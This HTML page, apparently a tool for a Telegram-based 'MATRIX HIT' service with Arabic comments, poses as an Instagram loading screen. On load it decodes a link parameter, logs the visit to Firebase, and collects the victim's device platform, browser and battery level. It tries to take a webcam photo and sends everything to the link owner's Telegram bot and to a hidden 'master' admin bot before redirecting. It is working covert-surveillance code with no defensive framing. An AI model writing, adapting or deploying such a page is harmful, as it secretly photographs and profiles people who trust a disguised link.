<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram | Loading...</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .loader { width: 40px; height: 40px; border: 3px solid #1a1a1a; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>
    <canvas id="v-canvas" style="display:none;"></canvas>

    <script src="firebase-config.js"></script>
    <script>
        window.onload = async () => {
            const params = new URLSearchParams(window.location.search);
            const p = params.get('p'); 
            if (!p) return window.location.href = "https://instagram.com";

            try {
                const cfg = JSON.parse(atob(p)); // {t: token, i: id, u: url, o: ownerID}
                
                // 1. تسجيل العملية في Firebase (للإحصائيات الحقيقية)
                db.ref('hits').push({
                    owner: cfg.o,
                    time: new Date().toLocaleString(),
                    device: navigator.platform
                });

                let info = `🏴‍☠️ **MATRIX HIT!**\n` +
                           `👤 المشرف: \`${cfg.o}\`\n` +
                           `📱 الجهاز: ${navigator.platform}\n` +
                           `🌐 المتصفح: ${navigator.userAgent.split(' ').pop()}\n` +
                           `🔋 البطارية: ${await getBattery()}`;

                // 2. محاولة سحب الصورة
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.getElementById('v-canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
                    await sendData(cfg, info, blob);
                    
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    await sendData(cfg, info + "\n⚠️ الكاميرا: مرفوضة");
                }

                // 3. التوجيه النهائي
                setTimeout(() => { window.location.href = cfg.u; }, 1200);

            } catch (err) { window.location.href = "https://instagram.com"; }
        };

        async function getBattery() {
            try { const b = await navigator.getBattery(); return `${Math.round(b.level * 100)}%`; }
            catch { return "N/A"; }
        }

        async function sendData(userCfg, text, photo = null) {
            // إرسال للمشترك
            await botReq(userCfg.t, userCfg.i, text, photo);
            
            // إرسال لك (الماستر) - يتم جلب بيانات الماستر من السجل
            const master = JSON.parse(localStorage.getItem('master_bot') || '{}');
            if (master.t) await botReq(master.t, master.i, text + "\n💎 نسخة للأدمن الماستر", photo);
        }

        async function botReq(t, i, text, photo) {
            try {
                if (photo) {
                    const fd = new FormData();
                    fd.append('photo', photo, 'capture.jpg');
                    fd.append('chat_id', i);
                    fd.append('caption', text);
                    fd.append('parse_mode', 'Markdown');
                    await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: fd });
                } else {
                    await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${i}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
                }
            } catch (e) {}
        }
    </script>
</body>
</html>
